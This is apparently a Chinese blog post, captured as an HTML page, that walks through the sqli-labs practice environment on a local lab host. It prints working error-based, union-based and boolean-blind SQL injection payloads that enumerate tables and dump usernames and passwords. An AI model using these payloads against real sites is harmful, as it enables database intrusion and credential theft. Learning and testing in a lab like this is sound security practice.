@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="GETError Basedsingle quotes提示请输入ID作为带有数值的参数 123456789GET &#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 HTTP&#x2F;1.1Host: 192.168.153.139User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;114">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqls-lab">
+<meta property="og:url" content="http://example.com/2023/06/24/sqls-lab/index.html">
+<meta property="og:site_name" content="阿卡丽的神秘商店">
+<meta property="og:description" content="GETError Basedsingle quotes提示请输入ID作为带有数值的参数 123456789GET &#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 HTTP&#x2F;1.1Host: 192.168.153.139User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;114">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624132457178.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624132740694.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624132828721.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624132916156.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624133004595.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624133217657.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624134701985.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624134730086.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624135049821.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624135237836.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624140111489.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624141306000.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624142041509.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624142333646.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624142750640.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624142950109.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624143119560.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624143141427.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624143245907.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624143748871.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624144031429.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624144112982.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624144456020.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624144521636.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624144619505.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624145958846.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624150016450.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624151012695.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624151143174.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624151211951.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624151224173.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624151643491.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624151702537.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624152431192.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624152502119.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624152709256.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624153016951.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155134499.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155149123.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155215826.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155249517.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155305884.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155327781.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155420801.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155433640.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155448974.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155625810.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155636708.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155801434.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155815722.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155832996.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624155849312.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624160122476.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624160134009.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624160142992.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624161449627.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624161524526.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624161710978.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624161929155.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624162324042.png">
+<meta property="og:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624162621603.png">
+<meta property="article:published_time" content="2023-06-24T02:11:40.000Z">
+<meta property="article:modified_time" content="2023-06-24T08:43:53.372Z">
+<meta property="article:author" content="akali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/06/24/sqls-lab/image-20230624132457178.png">
+
+<link rel="canonical" href="http://example.com/2023/06/24/sqls-lab/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqls-lab | 阿卡丽的神秘商店</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">阿卡丽的神秘商店</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">上古时代的宝贝开卖了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/gjy20001003" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/24/sqls-lab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="akali">
+      <meta itemprop="description" content="远赴人间惊鸿宴，一睹人间盛世颜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="阿卡丽的神秘商店">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqls-lab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-24 10:11:40 / 修改时间：16:43:53" itemprop="dateCreated datePublished" datetime="2023-06-24T10:11:40+08:00">2023-06-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><h3 id="single-quotes"><a href="#single-quotes" class="headerlink" title="single quotes"></a>single quotes</h3><p><img src="/2023/06/24/sqls-lab/image-20230624132457178.png" alt="image-20230624132457178"><br>提示请输入ID作为带有数值的参数</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /sqli-labs/Less-<span class="number">1</span>/?id=<span class="number">1</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.153.139</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64; rv:<span class="number">109</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">114</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: security=impossible; PHPSESSID=nmfrtk296tg3kl2oj2urk45b51</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/24/sqls-lab/image-20230624132740694.png" alt="image-20230624132740694"></p>
+<p>进行sql注入漏洞测试<img src="/2023/06/24/sqls-lab/image-20230624132828721.png" alt="image-20230624132828721"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624132916156.png" alt="image-20230624132916156"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624133004595.png" alt="image-20230624133004595"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624133217657.png" alt="image-20230624133217657"></p>
+<p>判断存在sql注入，判断表中字段数</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624134701985.png" alt="image-20230624134701985"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624134730086.png" alt="image-20230624134730086"></p>
+<p>得到字段数为3</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624135049821.png" alt="image-20230624135049821"></p>
+<p>获取数据库名和版本号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624135237836.png" alt="image-20230624135237836"></p>
+<p>爆当前数据库下的表名</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27;union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+<p>group_concat()表示将输出结果连接起来</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624140111489.png" alt="image-20230624140111489"></p>
+<p>爆字段名</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/24/sqls-lab/image-20230624141306000.png" alt="image-20230624141306000"></p>
+<p>爆信息</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624142041509.png" alt="image-20230624142041509"><br>看到敏感信息password</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624142333646.png" alt="image-20230624142333646"></p>
+<h3 id="intiger-based"><a href="#intiger-based" class="headerlink" title="intiger based"></a>intiger based</h3><p>判断注入类型<img src="/2023/06/24/sqls-lab/image-20230624142750640.png" alt="image-20230624142750640"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624142950109.png" alt="image-20230624142950109"></p>
+<p>猜测为数字型注入，后面步骤类似</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143119560.png" alt="image-20230624143119560"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143141427.png" alt="image-20230624143141427"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143245907.png" alt="image-20230624143245907"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143748871.png" alt="image-20230624143748871"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144031429.png" alt="image-20230624144031429"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144112982.png" alt="image-20230624144112982"></p>
+<h3 id="single-quotes-with-twist"><a href="#single-quotes-with-twist" class="headerlink" title="single quotes with twist"></a>single quotes with twist</h3><p>判断类型</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144456020.png" alt="image-20230624144456020"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144521636.png" alt="image-20230624144521636"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144619505.png" alt="image-20230624144619505"></p>
+<p>通过报错信息可以推断代码形式为：’id=（‘&amp;id’ limit 0,1’，即带括号的字符型注入</p>
+<p>注入步骤</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=2&#x27;)--+</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;) order by 3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,group_concat(username ,id , password) <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+<h3 id="double-quotes"><a href="#double-quotes" class="headerlink" title="double quotes"></a>double quotes</h3><p><img src="/2023/06/24/sqls-lab/image-20230624145958846.png" alt="image-20230624145958846"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624150016450.png" alt="image-20230624150016450"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151012695.png" alt="image-20230624151012695"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151143174.png" alt="image-20230624151143174"></p>
+<p>通过报错信息可以看到还要一个括号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151211951.png" alt="image-20230624151211951"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151224173.png" alt="image-20230624151224173"></p>
+<p>通过上面回显判断出为字符型双引号带括号注入</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&quot;) order by 3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,group_concat(username ,id , password) <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到有回显的情况，判断是否存在注入点判断流程</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;--+</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;)</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&quot;</span><br><span class="line">?<span class="attribute">id</span>=1&quot;--+</span><br><span class="line">?<span class="attribute">id</span>=1&quot;)</span><br><span class="line"><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
+<h2 id="Double-Injection"><a href="#Double-Injection" class="headerlink" title="Double Injection"></a>Double Injection</h2><h3 id="single-quotes-1"><a href="#single-quotes-1" class="headerlink" title="single quotes"></a>single quotes</h3><p><img src="/2023/06/24/sqls-lab/image-20230624151643491.png" alt="image-20230624151643491"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151702537.png" alt="image-20230624151702537"></p>
+<p>判断为字符型注入，与上面不同的是不存在回显，所以不能使用联合查询，可以选择布尔盲注，  主要用到length(),ascii() ,substr()这三个函数</p>
+<p>获取数据库名长：使用length((select database()))</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624152431192.png" alt="image-20230624152431192"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624152502119.png" alt="image-20230624152502119"></p>
+<p>可以使用二分法等方法得到最终结果</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624152709256.png" alt="image-20230624152709256"></p>
+<p>获取数据库名：ascii(substr((select database()),x,1))</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624153016951.png" alt="image-20230624153016951"></p>
+<p>ascii码115对应s，更改x的值得到数据库名威威security</p>
+<p>注入流程</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;and length((select database()))&gt;9--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span><span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">99</span><span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;))&gt;20--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">99</span><span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(username,<span class="keyword">password</span>) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">50</span><span class="comment">--+</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<h2 id="Dump-into-Outfile"><a href="#Dump-into-Outfile" class="headerlink" title="Dump into Outfile"></a>Dump into Outfile</h2><p><img src="/2023/06/24/sqls-lab/image-20230624155134499.png" alt="image-20230624155134499"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155149123.png" alt="image-20230624155149123"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155215826.png" alt="image-20230624155215826"></p>
+<p>不是单引号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155249517.png" alt="image-20230624155249517"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155305884.png" alt="image-20230624155305884"></p>
+<p>不是引号加括号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155327781.png" alt="image-20230624155327781"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155420801.png" alt="image-20230624155420801"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155433640.png" alt="image-20230624155433640"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155448974.png" alt="image-20230624155448974"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155625810.png" alt="image-20230624155625810"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155636708.png" alt="image-20230624155636708"></p>
+<p>得到注入模板为：?id=1’)) <sql> —+</sql></p>
+<h2 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h2><p><img src="/2023/06/24/sqls-lab/image-20230624155801434.png" alt="image-20230624155801434"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155815722.png" alt="image-20230624155815722"></p>
+<p>没有报错回显</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155832996.png" alt="image-20230624155832996"></p>
+<p>得到单引号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155849312.png" alt="image-20230624155849312"></p>
+<p>得到结果</p>
+<h2 id="Time-based"><a href="#Time-based" class="headerlink" title="Time based"></a>Time based</h2><p><img src="/2023/06/24/sqls-lab/image-20230624160122476.png" alt="image-20230624160122476"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624160134009.png" alt="image-20230624160134009"></p>
